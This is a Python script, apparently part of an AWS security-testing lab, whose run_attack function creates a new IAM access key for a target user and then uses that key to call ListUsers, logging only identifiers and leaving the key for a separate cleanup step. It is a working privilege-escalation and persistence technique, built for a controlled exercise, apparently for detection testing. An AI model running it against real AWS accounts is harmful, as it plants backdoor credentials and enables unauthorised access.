"""Create one access key, then use it for ListUsers. Called by setup.py."""

import json
import time
from datetime import datetime, timezone
from pathlib import Path

import boto3
from botocore.config import Config
from botocore.exceptions import ClientError


def utc_now() -> str:
    return datetime.now(timezone.utc).isoformat()


def save_record(path: Path, record: dict) -> None:
    # Record only identifiers, timestamps and outcomes, never credentials.
    temporary = path.with_suffix(".tmp")
    temporary.write_text(json.dumps(record, indent=2) + "\n", encoding="utf-8")
    temporary.replace(path)


def run_attack(session: boto3.Session, target_user: str,
               record_path: Path, record: dict) -> None:
    # The supplied session already has temporary credentials.
    # No AssumeRole, GetCallerIdentity or cleanup is performed here.
    # Disable hidden retries, especially for the non-idempotent key creation.
    config = Config(retries={"mode": "standard", "total_max_attempts": 1},
                    connect_timeout=10, read_timeout=30)
    iam = session.client("iam", config=config)
    record.update(attack_start=utc_now(), attack_status="incomplete")
    save_record(record_path, record)

    try:
        response = iam.create_access_key(UserName=target_user)
        key = response["AccessKey"]
        record["created_access_key_id"] = key["AccessKeyId"]
        record["create_request_id"] = response["ResponseMetadata"]["RequestId"]
        # Save immediately so cleanup is possible even if ListUsers fails.
        save_record(record_path, record)
        print("CreateAccessKey succeeded.")

        # Explicit credentials prevent reuse of the original role's identity.
        # This IAM-user key has no session token. Keep its secret in memory only.
        new_session = boto3.Session(
            aws_access_key_id=key["AccessKeyId"],
            aws_secret_access_key=key["SecretAccessKey"],
            aws_session_token=None,
            region_name=session.region_name,
        )
        new_iam = new_session.client("iam", config=config)
        record["list_users_attempts"] = []

        # IAM changes may take time to propagate. Retry only ListUsers.
        # Failed attempts are real API calls and may also appear in CloudTrail.
        for attempt in range(6):
            entry = {"time": utc_now()}
            record["list_users_attempts"].append(entry)
            try:
                # One result is enough to demonstrate permission; no pagination.
                result = new_iam.list_users(MaxItems=1)
                entry.update(status="success",
                             request_id=result["ResponseMetadata"]["RequestId"])
                break
            except ClientError as exc:
                code = exc.response["Error"]["Code"]
                entry.update(status="failed", error_code=code,
                             request_id=exc.response.get("ResponseMetadata", {}).get("RequestId"))
                save_record(record_path, record)
                if code not in {"InvalidClientTokenId", "AccessDenied"} or attempt == 5:
                    raise
                print(f"ListUsers: {code}; retrying in 5 seconds.")
                time.sleep(5)

        record["attack_status"] = "success"
        print("ListUsers succeeded with the NEW key. No user list was saved.")
    finally:
        record["attack_end"] = utc_now()
        save_record(record_path, record)
        print("The key is NOT deleted automatically. Run cleanup.py after verification.")


if __name__ == "__main__":
    raise SystemExit("Run setup.py; it calls this file with credentials held in memory.")
